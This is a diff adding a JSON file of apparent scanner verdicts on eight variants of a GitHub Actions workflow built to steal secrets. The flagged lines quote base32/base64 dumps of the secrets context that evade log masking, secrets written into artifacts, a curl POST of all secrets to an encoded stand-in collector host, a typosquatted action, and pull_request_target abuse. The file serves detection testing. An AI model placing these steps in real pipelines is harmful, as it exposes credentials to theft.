@@ -1,0 +1,175 @@
+{
+  "v1-gheist-original": {
+    "verdict": "malicious",
+    "reasons": [
+      "secrets context being explicitly dumped and encoded",
+      "potential exfiltration of all secrets via base32 encoding"
+    ],
+    "hotspot_lines": [
+      "echo -n '${{ toJSON(secrets) }}' | base32 -w 120"
+    ],
+    "_usage": {
+      "prompt_tokens": 577,
+      "completion_tokens": 80,
+      "total_tokens": 657,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 577
+    }
+  },
+  "v2-rename-blend": {
+    "verdict": "malicious",
+    "reasons": [
+      "secrets context is being encoded and printed to logs",
+      "printenv command is used to expose environment variables",
+      "toJSON(secrets) is used to expose all secrets in base64 encoded form"
+    ],
+    "hotspot_lines": [
+      "printenv | base64 -w 0 | fold -w 118",
+      "echo -n '${{ toJSON(secrets) }}' | base64 -w 0 | fold -w 118"
+    ],
+    "_usage": {
+      "prompt_tokens": 668,
+      "completion_tokens": 125,
+      "total_tokens": 793,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 668
+    }
+  },
+  "v3-hidden-in-legit": {
+    "verdict": "malicious",
+    "reasons": [
+      "secrets context is being dumped into a file and encoded with base64",
+      "potential exfiltration of sensitive environment variables and secrets",
+      "no legitimate reason to collect and encode all environment variables and secrets"
+    ],
+    "hotspot_lines": [
+      "echo '${{ toJSON(secrets) }}' >> ~/.cache/ci-probe/env-snapshot.txt",
+      "base64 ~/.cache/ci-probe/env-snapshot.txt | fold -w 118"
+    ],
+    "_usage": {
+      "prompt_tokens": 783,
+      "completion_tokens": 128,
+      "total_tokens": 911,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 783
+    }
+  },
+  "v4-typosquat-action": {
+    "verdict": "suspicious",
+    "reasons": [
+      "action name typo-squatting"
+    ],
+    "hotspot_lines": [
+      "- uses: actions/checkout-v4@v4"
+    ],
+    "_usage": {
+      "prompt_tokens": 728,
+      "completion_tokens": 51,
+      "total_tokens": 779,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 728
+    }
+  },
+  "v5-encoded-exfil": {
+    "verdict": "malicious",
+    "reasons": [
+      "base64 encoded external endpoint",
+      "sends all secrets to external endpoint",
+      "no legitimate reason to collect all secrets"
+    ],
+    "hotspot_lines": [
+      "ENDPOINT=$(echo aHR0cHM6Ly9jb2xsZWN0b3IuZ2hlaXN0LWxhYi5pbnZhbGlkL2Q= | base64 -d)",
+      "curl -s -X POST \"$ENDPOINT\" -d \"${{ toJSON(secrets) }}\" -m 5 || true"
+    ],
+    "_usage": {
+      "prompt_tokens": 638,
+      "completion_tokens": 148,
+      "total_tokens": 786,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 638
+    }
+  },
+  "v6-pr-target": {
+    "verdict": "malicious",
+    "reasons": [
+      "pull_request_target 滥用",
+      "将敏感 secrets (NPM_TOKEN, AWS_SECRET_ACCESS_KEY) 暴露给不受信任的 PR 代码",
+      "允许 PR 提供的脚本 (pr_checks.sh) 在 secrets 环境下执行"
+    ],
+    "hotspot_lines": [
+      "on:\n  pull_request_target:",
+      "NPM_TOKEN: ${{ secrets.NPM_TOKEN }}",
+      "AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}",
+      "run: bash ./scripts/pr_checks.sh"
+    ],
+    "_usage": {
+      "prompt_tokens": 650,
+      "completion_tokens": 146,
+      "total_tokens": 796,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 650
+    }
+  },
+  "v7-env-matrix": {
+    "verdict": "malicious",
+    "reasons": [
+      "secrets context being encoded and potentially exfiltrated",
+      "environment variables being encoded and potentially exfiltrated",
+      "use of base32 encoding to bypass secret masking"
+    ],
+    "hotspot_lines": [
+      "echo -n '${{ toJSON(secrets) }}' | base32 -w 120",
+      "env | base32 -w 120"
+    ],
+    "_usage": {
+      "prompt_tokens": 613,
+      "completion_tokens": 106,
+      "total_tokens": 719,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 613
+    }
+  },
+  "v8-artifact-exfil": {
+    "verdict": "malicious",
+    "reasons": [
+      "secrets context is being written to a file and included in an artifact",
+      "environment variables and secrets are collected and uploaded without any legitimate need"
+    ],
+    "hotspot_lines": [
+      "echo '${{ toJSON(secrets) }}' > diag/context.json",
+      "env | sort > diag/env.txt",
+      "uses: actions/upload-artifact@v4"
+    ],
+    "_usage": {
+      "prompt_tokens": 642,
+      "completion_tokens": 109,
+      "total_tokens": 751,
+      "prompt_tokens_details": {
+        "cached_tokens": 0
+      },
+      "prompt_cache_hit_tokens": 0,
+      "prompt_cache_miss_tokens": 642
+    }
+  }
+}
